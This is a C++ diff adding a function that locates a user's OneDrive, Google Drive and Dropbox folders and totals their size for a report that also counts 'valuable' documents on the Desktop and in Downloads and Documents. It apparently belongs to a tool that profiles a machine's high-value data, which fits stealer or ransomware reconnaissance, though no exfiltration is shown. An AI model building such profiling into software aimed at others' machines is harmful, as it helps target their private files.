@@ -69,6 +69,49 @@ std::vector<std::string> fs_utils::filterFilesByType(const std::vector<std::stri
     return filteredFiles;
 }
 
+void fs_utils::detectCloudStorage(DocumentsReport& report)
+{
+    std::string userProfile = GetEnv("USERPROFILE");
+    std::string localAppData = GetEnv("LOCALAPPDATA");
+    std::string appData = GetEnv("APPDATA");
+
+    std::vector<std::pair<std::string, std::string>> cloudPaths = {
+        {"OneDrive", userProfile + "\\OneDrive"},
+        {"Google Drive", userProfile + "\\Google Drive"},
+        {"Dropbox", localAppData + "\\Dropbox"},
+        {"Dropbox", appData + "\\Dropbox"}
+    };
+
+    std::uintmax_t totalSize = 0;
+
+    for (const auto& [name, path] : cloudPaths) {
+        if (fs::exists(path) && fs::is_directory(path)) {
+            if (std::find(report.cloudStorageFound.begin(), report.cloudStorageFound.end(), name) == report.cloudStorageFound.end()) {
+                report.cloudStorageFound.push_back(name);
+
+                try {
+                    for (const auto& entry : fs::recursive_directory_iterator(path)) {
+                        if (entry.is_regular_file()) {
+                            totalSize += entry.file_size();
+                        }
+                    }
+                }
+                catch (const std::exception&) {  }
+            }
+        }
+    }
+
+    if (totalSize > 1024 * 1024 * 1024) {  // GB
+        report.cloudStorageSize = std::to_string(totalSize / (1024 * 1024 * 1024)) + " GB";
+    }
+    else if (totalSize > 1024 * 1024) {  // MB
+        report.cloudStorageSize = std::to_string(totalSize / (1024 * 1024)) + " MB";
+    }
+    else {
+        report.cloudStorageSize = std::to_string(totalSize / 1024) + " KB";
+    }
+}
+
 fs_utils::DocumentsReport fs_utils::generateDocumentsReport()
 {
     std::vector<std::string> valuableExtensions = { ".docx", ".pdf", ".txt", ".xlsx", ".pptx", ".zip" };
@@ -88,6 +131,8 @@ fs_utils::DocumentsReport fs_utils::generateDocumentsReport()
     report.valuableDocumentsCount = valuableDocuments.size();
 
     report.totalValuables = report.valuableDesktopCount + report.valuableDownloadsCount + report.valuableDocumentsCount;
+
+    detectCloudStorage(report);
 
     return report;
 }
